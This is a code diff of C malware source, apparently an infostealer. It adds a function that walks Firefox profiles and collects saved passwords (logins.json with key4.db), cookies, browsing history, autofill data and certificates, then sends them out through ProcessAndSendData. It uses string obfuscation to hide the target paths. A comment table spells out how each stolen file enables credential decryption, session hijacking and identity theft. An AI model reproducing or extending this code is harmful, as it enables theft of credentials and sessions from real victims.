@@ -229,10 +229,10 @@ ExtractUserData(int brwsrPathOfshit,
     lstrcatW(resultStrBrwsrOfshit, L"/");
     lstrcatW(resultStrBrwsrOfshit, L"dp.txt");
 
-    processedFile = ProcessingTheWideStr(resultStrBrwsrOfshit);
+    processedFile = ProccessingOrMapsTheWideCharacter(resultStrBrwsrOfshit);
 
     if (fileDataSize) {
-        ProcessFilePathAndUpdateSession(*SysInfo, processedFile);  // IM HERE
+        ProcessFilePathAndUpdateSession(*SysInfo, processedFile);
         blabla((int)*SysInfo, rawFileData, fileDataSize);
         blabla((char *)*SysInfo);
     }
@@ -280,6 +280,79 @@ ExtractUserData(int brwsrPathOfshit,
     free(rawFileData);
 
     return finalCheckResult;
+}
+
+void __fastcall 
+ExtractFirefoxProfileData(int firefoxProfilePath, 
+                          const WCHAR *browserName, 
+                          DWORD *sysInfo)
+{ /*---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    File Name               Location                                    Purpose                                            Exploitation Risk
+    ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    key4.db                 %APPDATA%\Mozilla\Firefox\Profiles\         Stores encryption keys for stored passwords        If stolen, attackers can decrypt stored credentials from logins.json
+    logins.json             %APPDATA%\Mozilla\Firefox\Profiles\         Contains saved usernames & passwords               When combined with key4.db, all stored credentials can be recovered
+    cookies.sqlite          %APPDATA%\Mozilla\Firefox\Profiles\         Stores session cookies from websites               Used for session hijacking, allowing attackers to bypass logins
+    places.sqlite           %APPDATA%\Mozilla\Firefox\Profiles\         Stores browsing history & bookmarks                Attackers can track victim activity, steal sensitive URLs, and identify frequented sites
+    formhistory.sqlite      %APPDATA%\Mozilla\Firefox\Profiles\         Stores autofill data (names, emails, addresses)    Can be used for identity theft and profiling victims
+    cert9.db                %APPDATA%\Mozilla\Firefox\Profiles\         Stores security certificates & trust settings      Could be used for MITM attacks
+    ----------------------------------------------------------------------------------------------------------
+    File Stolen                   What Happens?
+    ----------------------------------------------------------------------------------------------------------
+    key4.db + logins.json         All saved passwords are decrypted & stolen
+    cookies.sqlite                Attackers hijack active website sessions (bypass logins)
+    places.sqlite                 They see full browsing history, including financial sites
+    formhistory.sqlite            Can steal addresses, emails, and autofill data for phishing
+    cert9.db                      Could be used for MITM attacks (fake SSL certs, phishing)
+    ----------------------------------------------------------------------------------------------------------*/
+    void *profileBuffer;
+    void (__stdcall *GetFullPathFunction)(int, void *, int); 
+    const WCHAR **profileEntries;
+    WCHAR *fullFilePath;
+    LPCWSTR *dataProcessingBuffer;
+    const WCHAR *profileName;
+    const WCHAR *profilePath;
+    int profileCount;
+
+    profileBuffer = calloc(0x104u, 2u);
+
+    GetFullPathFunction(firefoxProfilePath, profileBuffer, 260);
+
+    if (verifyFileStatus(profileBuffer))
+    {
+        profileCount = 0;
+        profileEntries = (const WCHAR **)calloc(0x320u, 1u);
+
+        checkFileExistence_0((int)profileBuffer, L"*", (int)profileEntries, &profileCount);
+
+        for (; profileCount; --profileCount)
+        {
+            profileName = *profileEntries;
+            profilePath = profileEntries[1];
+
+            fullFilePath = (WCHAR *)calloc(0x104u, 2u);
+            lstrcatW(fullFilePath, profilePath);
+            lstrcatW(fullFilePath, L"\\key4.db");
+
+            if (verifyFileStatus(fullFilePath))
+            {
+                dataProcessingBuffer = (LPCWSTR *)malloc(0xCu);
+                *dataProcessingBuffer = browserName;
+                dataProcessingBuffer[1] = profileName;
+                dataProcessingBuffer[2] = profilePath;
+
+                handleDataProcessing(dataProcessingBuffer, L"key4.db", sysInfo);          // password encryption key
+                handleDataProcessing(dataProcessingBuffer, L"cert9.db", sysInfo);        // certificates
+                handleDataProcessing(dataProcessingBuffer, L"formhistory.sqlite", sysInfo); // sutofill forms
+                handleDataProcessing(dataProcessingBuffer, L"cookies.sqlite", sysInfo);  // stored cookies
+                handleDataProcessing(dataProcessingBuffer, L"logins.json", sysInfo);     // saved passwords
+                handleDataProcessing(dataProcessingBuffer, L"places.sqlite", sysInfo);   // browsing history
+
+                free(dataProcessingBuffer);
+            }
+
+            profileEntries += 4;
+        }
+    }
 }
 
 int main(){
@@ -341,9 +414,15 @@ int main(){
   int sizer = sizeof(ExfilTargets) / sizeof(ExfilTargets[0]);
   
   for (int i = 0; i < sizer; i++) {
-      ExtractUserData(ExfilTargets[i].brwsrOfshit, ExfilTargets[i].brwsrPathOfshit, &SysInfo);
+      ExtractUserData(ExfilTargets[i].brwsrOfshit, ExfilTargets[i].brwsrPathOfshit, &SysInfo);    
   }
-
+    
   ProcessAndSendData(&SysInfo);
-  allocateMem(2, &SysInfo);
+  allocateMem(3, &SysInfo);
+
+  v30 = GetFilePath(L"Moziedx765lla Firefedx765ox");
+  v31 = GetFilePath(L"%appdaedx765ta%\\Moedx765zilla\\Firedx765efox\\Profedx765iles");
+  ExtractFirefoxProfileData((int)v31, (int)v30, (int)SysInfo);
+  ProcessAndSendData((size_t **)SysInfo);
+  return 0;
 }
